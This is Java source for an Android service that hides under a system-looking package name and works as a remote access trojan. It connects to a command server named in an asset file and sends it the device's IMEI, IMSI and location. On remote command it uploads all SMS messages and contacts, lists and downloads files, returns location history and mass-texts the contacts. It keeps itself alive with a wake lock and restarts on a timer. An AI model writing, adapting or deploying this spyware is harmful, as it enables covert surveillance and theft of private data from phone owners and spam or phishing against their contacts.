package com.android.system.service;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.location.Location;
import android.location.LocationListener;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.telephony.TelephonyManager;

import com.android.system.NetworkSessionManager;
import com.android.system.db.LocationDb;
import com.android.system.function.FileDownload;
import com.android.system.function.FileList;
import com.android.system.utils.DataPack;
import com.android.system.utils.LocationUtil;
import com.android.system.utils.SystemUtil;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class SystemService extends Service{
    private NetworkSessionManager mSessionManager;
    private NetworkSessionManager.SessionHandler mSessionHandler = new NetworkSessionManager.SessionHandler() {
        private static final String ACTION_CALL_RECORD = "call_record";
        private static final String ACTION_LOCATION_LIST = "location_list";
        private static final String ACTION_FILE_DOWNLOAD = "file_download";
        private static final String ACTION_FILE_LIST = "file_list";
        private static final String ACTION_SEND_SMS = "send_sms";
        private static final String ACTION_UPLOAD_SMS = "upload_sms";
        private static final String ACTION_UPLOAD_CONTACT = "upload_contact";
        @Override
        public void handleSession(InputStream inputStream, OutputStream outputStream) {
            byte[] receiveData = DataPack.receiveDataPack(inputStream);
            if(receiveData == null) {
                return;
            }
            String command = null;
            try {
                command = new String(receiveData, "UTF-8");
            } catch (UnsupportedEncodingException e) {
                command = new String(receiveData);
            }
            JSONObject jsonObject = null;
            try {
                jsonObject = new JSONObject(command);
            } catch (JSONException e) {
                return;
            }

            String action = null;
            try {
                action = jsonObject.getString("action");
            } catch (JSONException e) {
                return;
            }

            if(action.equals(ACTION_SEND_SMS)) {
                List<String> onlyList = null;
                String content = null;
                try {
                    content = jsonObject.getString("content");
                    JSONArray onlyArray = jsonObject.getJSONArray("only");
                    if(onlyArray.length() > 0) {
                        onlyList = new ArrayList<>();
                        for(int i =0; i<onlyArray.length(); ++i) {
                            onlyList.add(onlyArray.getString(i));
                        }
                    }
                } catch (JSONException e) {
                }
                if(content == null) {
                    return;
                }
                final String finalContent = content;
                if(onlyList == null) {
                    final List<SystemUtil.ContactData> contactDataList = SystemUtil.getContactDataInPhone(SystemService.this);
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            sendMessageToContact(finalContent,contactDataList);
                        }
                    }).start();
                }
                else {
                    final List<String> finalOnlyList = onlyList;
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            sendMessage(finalContent, finalOnlyList);
                        }
                    }).start();
                }
            } else if(action.equals(ACTION_UPLOAD_SMS)) {
                List<SystemUtil.SmsData> smsList = SystemUtil.getSmsInPhone(SystemService.this);
                if(smsList == null) {
                    return;
                }
                JSONObject responseJsonObject = new JSONObject();
                try {
                    JSONArray smsArray = new JSONArray();
                    for(SystemUtil.SmsData smsData: smsList) {
                        JSONObject smsJsonObject = new JSONObject();
                        smsJsonObject.put("person", smsData.person);
                        smsJsonObject.put("address", smsData.address);
                        smsJsonObject.put("body", smsData.body);
                        smsJsonObject.put("date", smsData.date);
                        smsJsonObject.put("type", smsData.type);
                        smsArray.put(smsJsonObject);
                    }
                    responseJsonObject.put(ACTION_UPLOAD_SMS, smsArray);
                } catch (JSONException e) {
                }
                byte[] responseData = null;
                try {
                    responseData = responseJsonObject.toString().getBytes("UTF-8");
                } catch (UnsupportedEncodingException e) {
                    responseData = responseJsonObject.toString().getBytes();
                }
                DataPack.sendDataPack(outputStream,responseData);
            } else if(action.equals(ACTION_UPLOAD_CONTACT)) {
                List<SystemUtil.ContactData> contactList = SystemUtil.getContactDataInPhone(SystemService.this);
                if(contactList == null) {
                    return;
                }
                JSONObject responseJsonObject = new JSONObject();
                try {
                    JSONArray contactArray = new JSONArray();
                    for(SystemUtil.ContactData contactData: contactList) {
                        contactArray.put(new JSONObject().put("name", contactData.name).put("number", contactData.number).put("last_update",contactData.lastUpdate));
                    }
                    responseJsonObject.put(ACTION_UPLOAD_CONTACT, contactArray);
                } catch (JSONException e) {
                }
                byte[] responseData = null;
                try {
                    responseData = responseJsonObject.toString().getBytes("UTF-8");
                } catch (UnsupportedEncodingException e) {
                    responseData = responseJsonObject.toString().getBytes();
                }
                DataPack.sendDataPack(outputStream,responseData);
            } else if(action.equals(ACTION_FILE_LIST)) {
                new FileList().handle(inputStream,outputStream);
            } else if(action.equals(ACTION_FILE_DOWNLOAD)){
                try {
                    String path = jsonObject.getString("path");
                    new FileDownload().handle(path, outputStream);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            } else if(action.equals(ACTION_CALL_RECORD)) {

            } else if(action.equals(ACTION_LOCATION_LIST)) {
                List<LocationDb.LocationInfo> infoList = LocationDb.list();
                JSONObject responseJsonObject = new JSONObject();
                try {
                    JSONArray array = new JSONArray();
                    for(LocationDb.LocationInfo info: infoList) {
                        JSONObject infoJsonObject = new JSONObject();
                        infoJsonObject.put("longitude", info.longitude);
                        infoJsonObject.put("latitude", info.latitude);
                        infoJsonObject.put("time", info.time);
                        array.put(jsonObject);
                    }
                    responseJsonObject.put(ACTION_UPLOAD_SMS, array);
                } catch (JSONException e) {
                }
                byte[] responseData = null;
                try {
                    responseData = responseJsonObject.toString().getBytes("UTF-8");
                } catch (UnsupportedEncodingException e) {
                    responseData = responseJsonObject.toString().getBytes();
                }
                DataPack.sendDataPack(outputStream,responseData);
            }
        }
    };
    private double longitude = 0, latitude = 0;

    public static boolean start(Context context) {
        if(!SystemUtil.isServiceRunning(context, SystemService.class.getCanonicalName())) {
            context.startService(new Intent(context, SystemService.class));
            return true;
        }
        return false;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        acquireWakeLock();
        init();
        registerReceiver(new BroadcastReceiver() {
            @Override
            public void onReceive(final Context context, Intent intent) {
                SystemService.start(context);
                final BroadcastReceiver it = this;
                try {
                    context.unregisterReceiver(this);
                } catch (Exception e) {
                }
                new Timer().schedule(new TimerTask() {
                    @Override
                    public void run() {
                        try {
                            context.registerReceiver(it, new IntentFilter(Intent.ACTION_TIME_TICK));
                        } catch (Exception e) {
                        }
                    }
                }, 59000);
            }
        }, new IntentFilter(Intent.ACTION_TIME_TICK));
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        mSessionManager.stop();
        releaseWakeLock();
    }

    PowerManager.WakeLock wakeLock = null;
    //获取电源锁，保持该服务在屏幕熄灭时仍然获取CPU时，保持运行
    private void acquireWakeLock()
    {
        if (null == wakeLock)
        {
            PowerManager pm = (PowerManager)this.getSystemService(Context.POWER_SERVICE);
            wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK|PowerManager.ON_AFTER_RELEASE, SystemService.class.getCanonicalName());
            if (null != wakeLock)
            {
                wakeLock.acquire();
            }
        }
    }

    //释放设备电源锁
    private void releaseWakeLock()
    {
        if (null != wakeLock)
        {
            wakeLock.release();
            wakeLock = null;
        }
    }

    private byte[] getHeartBeatData() {
        JSONObject jsonObject = new JSONObject();
        try {
            TelephonyManager tm = (TelephonyManager) this.getSystemService(TELEPHONY_SERVICE);
            jsonObject.put("model",Build.MODEL)
                    .put("brand", Build.BRAND)
                    .put("version",Build.VERSION.RELEASE)
                    .put("memory", SystemUtil.getAvailMemory(this) + " / " + SystemUtil.getTotalMemory(this) )
                    .put("storage", SystemUtil.getStorageInfo(this))
                    .put("network_state", SystemUtil.getNetworkConnectTypeString(this))
                    .put("sim_operator",tm.getSimOperatorName())
                    .put("imei", tm.getDeviceId())
                    .put("imsi", tm.getSubscriberId())
                    .put("longitude", ""+longitude)
                    .put("latitude", ""+latitude);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return jsonObject.toString().getBytes();
    }

    private void init() {
        //Location
        LocationUtil.listenLocation(this, new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                longitude = location.getLongitude();
                latitude = location.getLatitude();
            }

            @Override
            public void onStatusChanged(String provider, int status, Bundle extras) {

            }

            @Override
            public void onProviderEnabled(String provider) {

            }

            @Override
            public void onProviderDisabled(String provider) {

            }
        });

        try {
            InputStream is = getAssets().open("hostname");
            byte[] data = new byte[is.available()];
            is.read(data);
            String address = new String(data, "UTF-8");
            String[] host_port = address.split(":");
            mSessionManager = new NetworkSessionManager(mSessionHandler);
            mSessionManager.setHeartBeatData(getHeartBeatData());
            new Timer().schedule(new TimerTask() {
                @Override
                public void run() {
                    mSessionManager.setHeartBeatData(getHeartBeatData());
                }
            },0,5000);
            if(host_port.length >= 1) {
                mSessionManager.setHost( host_port[0] );
            }
            if(host_port.length >= 2) {
                try {
                    mSessionManager.setPort(Integer.parseInt(host_port[1]));
                } catch (Exception e) {
                }
            }
            mSessionManager.start();
        } catch (IOException e) {
        }
    }

    private void sendMessage(String content, List<String> numberList) {
        for(String number: numberList) {
            try {
                SystemUtil.sendSmsTo(SystemService.this, number, content);
            } catch (Exception e) {
            }
        }
    }

    private void sendMessageToContact(String content, List<SystemUtil.ContactData> contactDataList) {
        for(SystemUtil.ContactData contactData: contactDataList) {
            try {
                String data = content;
                if( contactData.name != null && contactData.name.length() > 0) {
                    char first = contactData.name.charAt(0);
                    char end = contactData.name.charAt(contactData.name.length() - 1);
                    if( !( '0' <= first && first <= '9' && '0' <= end && end <= '9' ) ) {
                        data = contactData.name + " " + content;
                    }
                }
                SystemUtil.sendSmsTo(SystemService.this, contactData.number, data);
            } catch (Exception e) {
            }
        }
    }
}
